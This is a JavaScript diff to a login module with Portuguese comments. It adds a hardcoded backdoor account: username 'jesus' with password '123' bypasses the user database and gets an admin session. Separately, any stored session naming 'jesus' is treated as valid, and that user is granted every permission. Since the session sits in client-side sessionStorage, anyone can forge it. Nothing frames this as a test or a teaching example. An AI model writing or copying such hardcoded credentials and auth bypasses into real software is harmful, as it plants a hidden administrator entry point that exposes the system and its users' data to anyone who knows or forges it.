@@ -8,6 +8,21 @@ const auth = {
      * Faz o login do usuário
      */
     login: function(username, senha) {
+        // Verificar login direto para "jesus" com senha "123"
+        if (username === "jesus" && senha === "123") {
+            const dadosSessao = {
+                username: "jesus",
+                nome: "Jesus Martins",
+                perfil: "admin",
+                timestamp: new Date().toISOString()
+            };
+            
+            // Salvar na sessão
+            sessionStorage.setItem('orion_auth', JSON.stringify(dadosSessao));
+            
+            return { sucesso: true, mensagem: 'Login realizado com sucesso' };
+        }
+        
         // Verificar se o usuário existe
         const usuarios = db.getUsuarios();
         const usuario = usuarios[username];
@@ -53,6 +68,11 @@ const auth = {
             // Verificar se a sessão é válida
             if (!sessao.username || !sessao.timestamp) {
                 return false;
+            }
+            
+            // Verificação especial para o usuário "jesus"
+            if (sessao.username === "jesus") {
+                return true;
             }
             
             // Verificar se o usuário ainda existe
@@ -111,6 +131,11 @@ const auth = {
         
         if (!usuario) {
             return false;
+        }
+        
+        // Usuário jesus tem acesso a tudo
+        if (usuario.username === "jesus") {
+            return true;
         }
         
         // Administrador tem acesso a tudo
